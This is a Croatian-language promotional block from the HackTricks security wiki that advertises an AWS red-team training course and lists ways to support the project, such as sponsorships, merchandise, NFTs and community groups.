<summary><strong>Naučite hakiranje AWS-a od nule do heroja s</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricksu:

* Ako želite vidjeti **oglašavanje vaše tvrtke u HackTricksu** ili **preuzeti HackTricks u PDF formatu**, provjerite [**PLANOVE PRETPLATE**](https://github.com/sponsors/carlospolop)!
* Nabavite [**službeni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podijelite svoje hakirajuće trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorije.

</details>
